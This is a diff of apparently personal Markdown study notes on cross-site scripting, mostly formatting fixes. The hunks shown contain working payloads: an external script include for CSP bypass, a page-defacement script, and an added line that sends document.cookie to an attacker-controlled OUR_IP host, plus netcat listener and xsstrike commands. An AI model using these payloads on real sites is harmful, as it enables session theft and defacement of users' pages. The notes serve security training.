@@ -24,8 +24,8 @@
   - Try leaving off closing bracket
 - [ ] Check content-type
 
-> [!tip] 
-> 
+> [!tip]
+>
 > This is particularly important for API endpoints
 >
 > If the content type doesn't match what is actually returned (e.g., text/html with JSON returned from an API), try accessing the endpoint directly and see if HTML injection is possible.
@@ -92,9 +92,9 @@ Example:
 Test message<script src=https://z2c8lw3i.eu4.ctfio.com/csp-upload/uploads/ac27121ae671cfeb22e3eb472e0e1997.js></script>
 ```
 
-## PostMessage
+## postMessage
 
-[postmessage](postmessage.md.md)
+[postMessage](postmessage.md)
 
 A way for different browser windows to be able to talk to each other.
 
@@ -230,10 +230,11 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 ### Defacement
 
 ```html
-<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
+<script>
+  document.getElementsByTagName("body")[0].innerHTML =
+    '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>';
+</script>
 ```
-
-
 
 ## DOM-Based XSS
 
@@ -300,6 +301,12 @@ if (isset($_GET['c'])) {
 ?>
 ```
 
+Try hosting our own script
+
+```js
+new Image().src = "http://OUR_IP/index.php?c=" + document.cookie;
+```
+
 ## Common Encoding Bypasses
 
 | Filter                | Bypass                                                                          |
@@ -331,7 +338,7 @@ if (isset($_GET['c'])) {
 | **Commands**                                                                                  |                                   |
 | `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
 | `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
-|`sudo php -S 0.0.0.0:80`|Start `PHP` server|
+| `sudo php -S 0.0.0.0:80`                                                                      | Start `PHP` server                |
 
 ---
 
